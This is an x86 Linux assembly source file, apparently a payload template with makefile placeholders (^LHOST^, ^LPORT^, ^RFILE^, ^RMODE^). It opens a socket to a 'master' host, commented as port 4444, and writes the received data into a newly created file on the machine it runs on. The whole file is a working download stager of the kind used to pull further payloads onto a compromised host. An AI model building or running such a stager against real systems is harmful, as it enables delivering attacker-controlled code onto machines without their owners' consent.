global _start

section .text

exit:
	push ebp
	mov ebp, esp

	mov eax, 0x01
	mov ebx, [ebp+8]
	int 0x80



;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; read write loop that copies data from one file descriptor to other
; args:
;    stack top
;   - input fd
; 	- output fd
rw_loop:
	push ebp
	mov ebp, esp
	sub esp, 0x1000 ; buffer

read_loop: 
	mov eax, 0x03    ; read
	mov ebx, [ebp+8] ; input fd
	mov ecx, esp     ; buf
	mov edx, 0xfff   ; buf_size - 1
	int 0x80
	cmp eax, 0
	jle end          ; nothing left to read or read error

write_loop:
	mov edx, eax      ; bytes_read
	mov eax, 0x04     ; write
	mov ebx, [ebp+12] ; output_fd
	mov ecx, esp
	int 0x80
	jmp read_loop

end:
	mov esp, ebp
	pop ebp
	ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

_start:
	; check if argv>1
	pop eax
	cmp eax, 1
	jg custom_path

	mov ebx, open_loc
	jmp create_outfile

custom_path:
	pop ebx ; argv[0]
	pop ebx ; argv[1]


create_outfile:
	; create and open a destination file
	mov eax, 0x08     ; creat(2)
	mov ecx, ^RMODE^  ; mode filled from makefile
	int 0x80
	mov edi, eax      ; 

	; create socket from which the file will be downloaded
	mov eax, 0x167 ; socket(2)
	mov ebx, 0x02  ; AF_INET 
	mov ecx, 0x01  ; SOCK_STREAM
	int 0x80
	mov esi, eax 

	; connect to master
	mov eax, 0x16a ; connect(2)
	mov ebx, esi   ; socket file descriptor

	push word  0x00
	push dword ^LHOST^ ; filled from makefile
	push word  ^LPORT^ ; port 4444
	push word  0x02    ; AF_INET
	mov ecx, esp
	mov edx, 16
	int 0x80

	; connection established, ready to copy
	push edi    ; write fd
	push esi    ; read fd (stdin for now)
	call rw_loop

	push 0x00	
	call exit

section .data
	open_loc db "^RFILE^", 0x0 ; filled from makefile

